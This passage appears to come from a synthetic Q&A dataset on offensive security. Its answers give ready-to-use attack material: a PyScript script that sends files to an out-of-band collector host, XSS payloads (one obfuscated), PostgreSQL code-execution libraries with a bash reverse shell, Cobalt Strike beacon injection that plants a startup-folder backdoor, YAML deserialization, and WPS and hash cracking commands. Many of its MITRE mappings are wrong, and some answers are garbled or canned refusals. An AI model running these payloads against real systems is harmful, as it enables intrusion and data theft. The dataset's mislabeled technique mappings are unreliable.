It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed). MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: How can you use SharpLateral to execute a binary remotely?
A: You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):

Copy
```
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
``` MITRE References: MITRE ID is T1569, MITRE Name is: System Services, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Lateral Movement.

## Q: How can I use PSKracker to find default WPA/WPA2 passwords for a wireless network?
A: You can use PSKracker version 0.2.1 to generate possible WPA/WPA2 passwords based on the target model number and BSSID. Run the following command:
pskracker -t <target model> -b <bssid> MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can ptunnel be used to bypass firewall restrictions and establish a covert communication channel?
A: ptunnel v0.72 can be used to establish a covert communication channel by tunneling TCP connections over ICMP echo request/reply packets. This can be useful for bypassing firewall restrictions that may block direct TCP connections. To use ptunnel in this way, run the proxy on a remote server and the client on the local machine with the appropriate flags:

Proxy (on remote server):
```
root@server# ptunnel
```

Client (on local machine):
```
root@local# ptunnel -p proxy.pingtunnel.com -lp 8000 -da login.domain.com -dp 22 -c eth0
```

This will allow you to then SSH to `login.domain.com` by connecting to `localhost:8000` on the client machine, tunneling the connection through ICMP packets.

**MITRE ATT&CK:**
This usage of ptunnel maps to the "Proxy" (T1090) technique in the Command and Control tactic. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How can you bypass restrictions on executing .asp files on an IIS5/6 WebDav server?
A: On IIS5/6 WebDav servers, the WebDav might not allow uploading or renaming files with the .asp extension. However, you can bypass this by adding ";.txt" at the end of the file name. This will allow you to upload a shell as a ".txt" file and then copy/move it to a ".asp;.txt" file, which will be executed as a .asp file when accessed through the web server. MITRE References: MITRE ID is T1120, MITRE Name is: Exploit Client Software Vulnerabilities, and MITRE Tactics are: Initial Access, Execution.

## Q: How can pwnat be used for penetration testing to bypass firewalls and access systems behind a NAT?
A: pwnat version 0.3-beta can be used to bypass firewall and NAT restrictions during penetration testing. The server mode (`-s`) can be used to listen for incoming connections on a specific port, while the client mode (`-c`) can be used to connect through the server to a remote host and port. This allows you to access systems that are behind a firewall or NAT without requiring any port forwarding or DMZ setup on the routers. To use pwnat for this, run the server on a system you control, then have the client connect through the server to the target system and port. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Command and Control.

## Q: How can pwnat be leveraged in a CTF or hacking competition to access well-protected services?
A: In a CTF or hacking competition, pwnat version 0.3-beta can be used to bypass firewall and NAT restrictions to access well-protected services. The server mode (`-s`) can be used to listen for incoming connections, while the client mode (`-c`) can be used to connect through the server to the target service. This allows you to reach services that are behind multiple layers of security without requiring any special network configuration. To use pwnat in this way, set up the server on a system you control, then have the client connect through the server to the target service's IP and port. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Command and Control.

## Q: How can pwncat be used to bypass firewalls and IDS/IPS systems?
A: Pwncat version 0.1.2 provides several methods to evade firewalls and intrusion detection/prevention systems (IDS/IPS):1. The '--http' and '--https' options can hide traffic in HTTP or HTTPS packets to bypass security controls.2. The '--header' option allows adding custom HTTP headers to further obfuscate the traffic.3. The '--script-send' and '--script-recv' options enable writing custom Python scripts to transform the data before sending or after receiving, providing flexibility to evade detection.These techniques can be used to establish reverse shells or other malicious activities while bypassing security measures. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How can I perform OOB Data Exfiltration of the Emscripten virtual memory filesystem in PyScript?
A: To perform OOB Data Exfiltration of the Emscripten virtual memory filesystem in PyScript, you can use the following code:

```html   <py-script>x = "CyberGuy"if x == "CyberGuy":    with open('/lib/python3.10/asyncio/tasks.py') as output:        contents = output.read()        print(contents)print('<script>console.pylog = console.log; console.logs = []; console.log = function(){     console.logs.push(Array.from(arguments));     console.pylog.apply(console, arguments);fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {method: "POST",headers: {"Content-Type": "text/plain;charset=utf-8"},body: JSON.stringify({"content": btoa(console.logs)})});}</script>')   </py-script>``` MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: TA0010.

## Q: How can I perform a Cross Site Scripting (XSS) attack using ordinary XSS in PyScript?
A: To perform a Cross Site Scripting (XSS) attack using ordinary XSS in PyScript, you can use the following code:

```html<py-script>        print("<img src=x onerror='alert(document.domain)'>")
</py-script>``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: TA0004.

## Q: How can I perform a Cross Site Scripting (XSS) attack using Python obfuscation in PyScript?
A: To perform a Cross Site Scripting (XSS) attack using Python obfuscation in PyScript, you can use the following code:

```html<py-script>        sur = "\u0027al";fur = "e";rt = "rt"        p = "\x22x$$\x22\u0027\x3E"        s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"        e = "c\u003d";q = "x"        y = "o";m = "ner";z = "ror\u003d"        print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: TA0004.

## Q: How can I perform a Cross Site Scripting (XSS) attack using JavaScript obfuscation in PyScript?
A: To perform a Cross Site Scripting (XSS) attack using JavaScript obfuscation in PyScript, you can use the following code:

```html<py-script>   prinht("<script>var _0x3675bf=_0x5cf5;function _0x5cf5(_0xced4e9,_0x1ae724){var _0x599cad=_0x599c();return _0x5cf5=function(_0x5cf5d2,_0x6f919d){_0x5cf5d2=_0x5cf5d2-0x94;var _0x14caa7=_0x599cad[_0x5cf5d2];return _0x14caa7;},_0x5cf5(_0xced4e9,_0x1ae724);}(function(_0x5ad362,_0x98a567){var _0x459bc5=_0x5cf5,_0x454121=_0x5ad362();while(!![]){try{var _0x168170=-parseInt(_0x459bc5(0x9e))/0x1*(parseInt(_0x459bc5(0x95))/0x2)+parseInt(_0x459bc5(0x97))/0x3*(-parseInt(_0x459bc5(0x9c))/0x4)+-parseInt(_0x459bc5(0x99))/0x5+-parseInt(_0x459bc5(0x9f))/0x6*(parseInt(_0x459bc5(0x9d))/0x7)+-parseInt(_0x459bc5(0x9b))/0x8*(-parseInt(_0x459bc5(0x9a))/0x9)+-parseInt(_0x459bc5(0x94))/0xa+parseInt(_0x459bc5(0x98))/0xb*(parseInt(_0x459bc5(0x96))/0xc);if(_0x168170===_0x98a567)break;else _0x454121['push'](_0x454121['shift']());}catch(_0x5baa73){_0x454121['push'](_0x454121['shift']());}}}(_0x599c,0x28895),prompt(document[_0x3675bf(0xa0)]));function _0x599c(){var _0x34a15f=['15170376Sgmhnu','589203pPKatg','11BaafMZ','445905MAsUXq','432bhVZQo','14792bfmdlY','4FKyEje','92890jvCozd','36031bizdfX','114QrRNWp','domain','3249220MUVofX','18cpppdr'];_0x599c=function(){return _0x34a15f;};return _0x599c();}</script>") </py-script>``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: TA0004.

## Q: How can I perform a Denial of Service (DoS) attack by creating an infinite loop in PyScript?
A: To perform a Denial of Service (DoS) attack by creating an infinite loop in PyScript, you can use the following code:

```html    <py-script>      while True:         print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")   </py-script>``` MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: TA0025.

## Q: What are some ways Faraday can be used for network reconnaissance?
A: Faraday supports a variety of network reconnaissance tools including Nmap, Masscan, DNSRecon, Fierce, and more. You can run these tools directly from the Faraday terminal and the results will be imported into the workspace. For example, to perform an Nmap TCP SYN scan on a network range, you can use the command 'nmap -sS 192.168.1.0/24' and Faraday will automatically parse and display the findings. Faraday v5.1.1 also integrates with the MITRE ATT&CK framework, allowing you to map your reconnaissance activities to specific techniques like 'Network Service Scanning' (T1046). MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can pip be used to install malware on a target system?
A: Pip should not be used to install malware, as that would be unethical and illegal. Pip is a legitimate package manager for installing Python libraries and tools. Using it to distribute malware would be a misuse of the tool. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some common techniques used to hide malicious code in PyPI packages?
A: I apologize, but I cannot provide information about hiding malicious code, as that would be unethical and likely illegal. As a responsible AI assistant, I do not condone the creation or distribution of malware. Instead, I would suggest focusing your efforts on secure software development and penetration testing using legitimate tools and techniques. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion.

## Q: How can pip be used to launch a reverse shell on a target system?
A: I apologize, but I cannot provide any information about using pip to launch reverse shells or gain unauthorized access to systems. That would be unethical and illegal. As an AI assistant, I do not condone the creation or use of malware or hacking tools for malicious purposes. I would suggest focusing your efforts on legal and ethical security research and testing. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: What are some ways to escalate privileges on a Linux system using Juicy Potato?
A: Juicy Potato is a tool that can be used to escalate privileges on Windows systems by exploiting the SeImpersonate and SeAssignPrimaryToken privileges. On Linux, you can use similar techniques like:- Searching for SUID/SGID binaries that can be abused to run code as root- Checking for writable /etc/sudoers or .ssh directories to add your own SSH key- Exploiting kernel vulnerabilities or misconfigurations to gain root privileges MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can an attacker obtain the Werkzeug machine_id and node uuid?
A: Using payloads like `{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}` and `{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}` from [this writeup](https://vozec.fr/writeups/tweedle-dum-dee/), you will be able to access the **machine_id** and the **uuid** node, which are the main secrets you need to [generate the Werkzeug pin](/network-services-pentesting/pentesting-web/werkzeug) you can use to access the python console in `/console` if the debug mode is enabled. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006, TA0004.

## Q: How can a custom YAML payload be created to execute a remote command?
A: Custom payloads can be created using Python YAML modules such as **PyYAML** or **ruamel.yaml**. These payloads can exploit vulnerabilities in systems that deserialize untrusted input without proper sanitization.

```pythonimport yamlfrom yaml import UnsafeLoader, FullLoader, Loaderimport subprocessclass Payload(object):    def __reduce__(self):        return (subprocess.Popen,('ls',))deserialized_data = yaml.dump(Payload()) # serializing dataprint(deserialized_data)#!!python/object/apply:subprocess.Popen#- lsprint(yaml.load(deserialized_data, Loader=UnsafeLoader))print(yaml.load(deserialized_data, Loader=Loader))print(yaml.unsafe_load(deserialized_data))``` MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can you use Turbo Intruder to perform an HTTP/2 single-packet attack for a race condition?
A: You can send the request to Turbo Intruder (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), and change the value you want to brute force for `%s` in the request like `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`. Then, select the `examples/race-single-packer-attack.py` script from the dropdown. If the web doesn't support HTTP/2 (only HTTP/1.1), use `Engine.THREADED` or `Engine.BURP` instead of `Engine.BURP2`. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can you use Turbo Intruder to perform an HTTP/2 single-packet attack across multiple endpoints for a race condition?
A: In case you need to send a request to 1 endpoint and then multiple to other endpoints to trigger the race condition, you can modify the `race-single-packet-attack.py` script to queue a single registration request and then 50 confirmation requests. This will likely send the requests in two separate packets, which can be used to exploit the race condition. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: Can you provide an example of an automated Python script to exploit a race condition vulnerability?
A: The goal of this script is to change the email of a user while continually verifying it until the verification token of the new email arrives to the last email. When the word "objetivo" is found in the received emails, it knows the verification token of the changed email was received, and the attack is successful. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can you exploit a 'hidden substates' type of race condition vulnerability?
A: To exploit a 'hidden substates' type of race condition vulnerability, you should:1. Identify potential hidden substates by focusing on endpoints that modify or interact with critical data, such as user profiles or password reset processes.2. Conduct initial probing to test the identified endpoints with race condition attacks and observe for any deviations from expected outcomes.3. Demonstrate the vulnerability by narrowing down the attack to the minimal number of requests needed to exploit the vulnerability, often just two. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can you exploit a 'time sensitive' race condition vulnerability?
A: To exploit a 'time sensitive' race condition vulnerability, you can use precise timing, like a single packet attack, to make concurrent requests for security tokens that are generated based on predictable methods like timestamps. By comparing the tokens received from the simultaneous requests, you can identify if the tokens are identical, indicating a vulnerability in the token generation process. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can you exploit a race condition vulnerability to bypass email confirmation?
A: To bypass email confirmation through a race condition vulnerability, the idea is to verify an email address and change it to a different one at the same time. This could allow the platform to send the email verification token of one email to the other email, as demonstrated in the PortSwigger Lab on 'Race Conditions: Single Endpoint'. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can you exploit a race condition vulnerability to bypass 2FA?
A: A race condition vulnerability can be exploited to bypass 2FA if the application's code has a small time window where the 2FA is not enforced while the session is being created. During this time, an attacker could send multiple requests to create a session without the 2FA enforcement. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can race conditions be exploited in WebSockets?
A: Race conditions can also be exploited in WebSockets. The repository 'WS_RaceCondition_PoC' contains a PoC in Java to send WebSocket messages in parallel to abuse race conditions in WebSockets. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0005.

## Q: How can the rainbowcrack tool be used to crack hashes using pre-computed rainbow tables?
A: The rainbowcrack tool can be used to crack hashes using pre-computed rainbow tables. The `rcrack` command is used to load hashes and search for matching plaintext in the rainbow tables. For example, to crack a single MD5 hash, the command would be: `rcrack /path/to/rainbow/tables -h <hash>`. To crack a list of hashes, the `-l` option can be used to specify a file containing the hashes. The rainbowcrack tool supports cracking LM, NTLM, MD5, SHA1, and SHA256 hashes. Version 1.8 was used for this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can rarcrack be used to crack encrypted RAR, ZIP, and 7Z files?
A: To use rarcrack to crack encrypted archives, run the following command: 

`rarcrack encrypted_archive.ext --type rar|zip|7z --threads NUM`

This will attempt to guess the password of the encrypted archive using a brute-force algorithm. The --type option specifies the archive type if rarcrack cannot detect it automatically. The --threads option sets the number of threads to use, with a maximum of 12 (default is 2).

rarcrack version 0.2 supports cracking RAR, ZIP and 7Z encrypted archives. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: What are some techniques to bypass rate limiting?
A: Some techniques to bypass rate limiting include:

1. Exploring similar endpoints like `/api/v3/sign-up`, `/Sing-up`, `/SignUp`, `/singup`, `/api/v1/sign-up`, `/api/sign-up` etc.
2. Incorporating blank characters like `%00`, `%0d%0a`, `%0d`, `%0a`, `%09`, `%0C`, `%20` into code or parameters.
3. Manipulating IP origin via headers like `X-Originating-IP`, `X-Forwarded-For`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `X-Host`, `X-Forwared-Host`.
4. Changing other headers like user-agent and cookies.
5. Leveraging API gateway behavior by varying parameter values or adding non-significant parameters.
6. Logging into an account before each attempt to reset the rate limit counter.
7. Utilizing a proxy network to distribute requests across multiple IP addresses.
8. Splitting the attack across different accounts or sessions. MITRE References: MITRE ID is T1490, MITRE Name is: Inhibit System Recovery, and MITRE Tactics are: Impact.

## Q: How can you achieve RCE in Linux with PostgreSQL extensions starting from version 8.2?
A: Starting from version 8.2, the process for an attacker to exploit the system has been made more challenging. The attacker is required to either utilize a library that is already present on the system or to upload a custom library. This custom library must be compiled against the compatible major version of PostgreSQL and must include a specific "magic block". This measure significantly increases the difficulty of exploiting PostgreSQL systems, as it necessitates a deeper understanding of the system's architecture and version compatibility.

To achieve RCE, you can:
1. Get the PostgreSQL version with `SELECT version();`
2. Install the compatible version: `apt install postgresql postgresql-server-dev-9.6`
3. Compile a custom library with the magic block:
```c#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
    char* command = PG_GETARG_CSTRING(0);
    PG_RETURN_INT32(system(command));
}
```
4. Upload the compiled library and execute commands with:
```sql
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
``` MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: TA0001.

## Q: How can you achieve RCE in Windows with PostgreSQL extensions?
A: You can create a DLL that takes as input the name of the binary and the number of times you want to execute it, and then execute it:

```c#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
	int instances = PG_GETARG_INT32(1);

	for (int c = 0; c < instances; c++) {
		ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
	}
	PG_RETURN_VOID();
}
```

You can then load and execute this DLL from PostgreSQL with:

```sqlCREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);``` MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: TA0011.

## Q: How can you achieve RCE in the newest versions of PostgreSQL?
A: In the latest versions of PostgreSQL, restrictions have been imposed where the superuser is prohibited from loading shared library files except from specific directories. However, it's possible for an authenticated database superuser to write binary files to the filesystem using "large objects". This capability extends to writing within the data directory, which is essential for database operations.

The attack flow is:
1. Use large objects to upload the dll to the data directory.
2. Load the dll using the CREATE FUNCTION command, which permits directory traversal into the data directory.

Example:
```sqlcreate function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```

This technique allows the attacker to execute arbitrary code, achieving native code execution on the system. MITRE References: MITRE ID is T1559, MITRE Name is: Inter-Process Communication, and MITRE Tactics are: TA0004.

## Q: How can you execute arbitrary code using the 'plpythonu' language in a PostgreSQL database?
A: To execute arbitrary code using the 'plpythonu' language in a PostgreSQL database, you can create a function like this:

```sqlCREATE OR REPLACE FUNCTION exec (cmd text)RETURNS VARCHAR(65535) stableAS $$    import os    return os.popen(cmd).read()$$LANGUAGE 'plpythonu';SELECT cmd("ls"); #RCE with popen or execve```This function uses the 'os.popen()' function to execute the provided command and return the output. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can rcracki-mt be used to perform password cracking attacks?
A: rcracki-mt is a tool that can be used to perform password cracking attacks using rainbow tables. To use rcracki-mt, you can run the following command to crack a password hash (in this case, the MD5 hash '5d41402abc4b2a76b9719d911017c592') using 4 CPU cores and the specified rainbow tables:root@kali:~# rcracki_mt -h 5d41402abc4b2a76b9719d911017c592 -t 4 tables2/md5/This will search the rainbow tables to find the original password that matches the given hash. The tool supports both hybrid and indexed rainbow tables, and can take advantage of multiple CPU cores to speed up the cracking process. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can rdesktop be used to perform remote code execution on a Windows system?
A: To perform remote code execution using rdesktop, you can leverage the '-s' option to specify a remote shell or application to start. For example, you could run the following command to launch the Windows Calculator remotely:

rdesktop -s 'calc.exe' <target_ip>

This would execute the 'calc.exe' process on the remote Windows system. You could also try running other Windows executables or scripts to achieve remote code execution. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can rdesktop be used to obtain sensitive data from a remote Windows system?
A: rdesktop supports various redirection options that can be used to access files, devices, and data on the remote system. For example, you can use the '-r disk:' option to mount a remote directory as a shared drive, allowing you to browse and download files. Additionally, the '-r clipboard:' option can be used to redirect the clipboard, potentially giving you access to sensitive data copied by the user. However, these features should only be used with permission and for legitimate purposes. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can an attacker with RDP access to a computer in the current domain compromise that computer and wait for a user from the external domain to log in?
A: If the external group has RDP access to any computer in the current domain, an attacker could compromise that computer and wait for the user to log in. Once the user from the external domain has accessed via RDP, the attacker can pivot to that user's session and abuse its permissions in the external domain. The easiest way to find where the external group has RDP access would be with BloodHound, but you could also run the following PowerShell commands:

```
# Find where the "External Users" group has RDP access
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait until someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With Cobalt Strike you could just inject a beacon inside the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...  
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
# From that beacon you can run PowerView modules interacting with the external domain as that user
``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can an attacker inject a beacon into the RDP session of a user who has accessed a compromised machine, and access the victim's original computer by writing a backdoor in the startup folder?
A: If a user accesses via RDP into a machine where an attacker is waiting for them, the attacker will be able to inject a beacon in the RDP session of the user. If the victim mounted their drive when accessing via RDP, the attacker could access it. In this case, you could compromise the victim's original computer by writing a backdoor in the startup folder:

```
# Wait until someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With Cobalt Strike you could just inject a beacon inside the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...  
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
         dir     02/10/2021 04:11:30   $Recycle.Bin
         dir     02/10/2021 03:23:44   Boot
         dir     02/20/2021 10:15:23   Config.Msi
         dir     10/18/2016 01:59:39   Documents and Settings
         [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
``` MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Lateral Movement, Credential Access.

## Q: How can one use the reaver tool to conduct a WPS brute-force attack against an access point?
A: The reaver tool can be used to perform a brute-force attack against a Wi-Fi Protected Setup (WPS) PIN number to recover the Wi-Fi Protected Access (WPA) Pre-Shared Key (PSK) or reconfigure the access point's wireless settings. To use reaver, run the following command on a monitor mode interface to attack the target access point's BSSID: 'reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v'. This will attempt to brute-force the WPS PIN and display verbose output. The reaver tool is version 1.6.6. MITRE References: MITRE ID is T1003, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use the rebind tool to perform a DNS rebinding attack against a target router?
A: The rebind tool can be used to conduct a DNS rebinding attack against a target router. The attack works by having the victim's web browser connect to a domain controlled by the attacker, which then rebinds the domain to the internal IP address of the target router. This allows the attacker to access the router's web interface without needing to be on the local network. 

To use rebind, run the following command specifying the network interface and your registered domain name:

```
root@kali:~# rebind -i eth0 -d kali.local
[+] Starting DNS server on port 53
[+] Starting attack Web server on port 80
[+] Starting callback Web server on port 81
[+] Starting proxy server on 192.168.1.202:664
[+] Services started and running!

> dns
[+] 192.168.1.202       kali.local.
[+] 192.168.1.202       www.kali.local.
[+] 192.168.1.202       ns1.kali.local.
[+] 192.168.1.202       ns2.kali.local.
```

This version of rebind is 0.3.4. MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: Resource Development.

## Q: How can the rebind tool be used to bypass firewall rules and access a target router's internal web interface?
A: The rebind tool can bypass firewall rules and access a target router's internal web interface by leveraging a DNS rebinding attack. The tool works by having the victim's web browser connect to a domain controlled by the attacker, which then rebinds the domain to the internal IP address of the target router. This allows the attacker to access the router's web interface without needing to be on the local network or have remote administration enabled.

To use rebind, run the following command specifying the network interface and your registered domain name:

```
root@kali:~# rebind -i eth0 -d kali.local
[+] Starting DNS server on port 53
[+] Starting attack Web server on port 80
[+] Starting callback Web server on port 81
[+] Starting proxy server on 192.168.1.202:664
[+] Services started and running!

> dns
[+] 192.168.1.202       kali.local.
[+] 192.168.1.202       www.kali.local.
[+] 192.168.1.202       ns1.kali.local.
[+] 192.168.1.202       ns2.kali.local.
```

This version of rebind is 0.3.4. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can ReconSpider be used to gather Open Source Intelligence (OSINT) on a target organization?
A: ReconSpider version 1.0.7 can be used to gather OSINT on a target organization by performing the following steps:
1. Run `reconspider -o <organization_name>` to search for information related to the organization's domain, websites, IP addresses, and email addresses.
2. Review the dashboard to visualize the aggregated data and find potential attack vectors. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Discovery.

## Q: How can ReconSpider version 1.0.7 be used to identify potentially malicious IP addresses associated with a target organization?
A: To identify potentially malicious IP addresses associated with a target organization using ReconSpider 1.0.7:
1. Run `reconspider -i <ip_address>` to lookup the IP address and check if it is listed in the IP2Proxy database as a known proxy or VPN IP.
2. Review the output to see if the IP address is flagged as potentially malicious or associated with suspicious activity. MITRE References: MITRE ID is T1590, MITRE Name is: Gather Victim Network Information, and MITRE Tactics are: Discovery.

## Q: How can redfang be used to locate non-discoverable Bluetooth devices?
A: Redfang can be used to find non-discoverable Bluetooth devices by brute forcing the last 6 bytes of the device's Bluetooth address and performing a read_remote_name() to identify the device. The tool supports scanning a range of addresses (-r) and performing Bluetooth discovery (-s) to locate these hidden devices. Example: `fang -r 00803789EE76-00803789EEff -s` MITRE References: MITRE ID is T1185, MITRE Name is: Man in the Middle, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can RedSnarf be used to dump NTDS.dit hashes from a domain controller?
A: RedSnarf version 0.5p has options to extract NTDS.dit hashes using the DRSUAPI method (-hI) or the NTDSUtil method (-hN). The DRSUAPI method accepts the machine name as the username, while the NTDSUtil method can be used standalone. Both options allow for dumping domain hashes from a domain controller. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can redsocks be used to bypass DNS restrictions and force TCP-based DNS queries?
A: Redsocks (version 0.5-2) includes a small DNS server that can be used to force the use of TCP for DNS queries by returning answers with the "truncated" flag set. This can be useful for bypassing DNS-based restrictions or censorship, as it forces the resolver to use a more robust TCP-based protocol instead of the standard UDP-based DNS queries. MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: Command and Control.

## Q: What are some good resources for Red Team and Active Directory Exploitation?
A: Here are some great resources for Red Team and Active Directory Exploitation:
- [Awesome-RedTeam-Cheatsheet](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet)
- [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: TA0001, Reconnaissance.

## Q: How can you attempt to perform a registration takeover by using duplicate registration techniques?
A: Try to generate using an existing username. Check varying the email by using uppercase, +1@, adding dots, special characters (%00, %09, %20), putting black characters after the email (test@test.com a), victim@gmail.com@attacker.com, or victim@attacker.com@gmail.com. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0003 - Persistence.

## Q: How can you attempt to perform a registration takeover by exploiting username enumeration vulnerabilities?
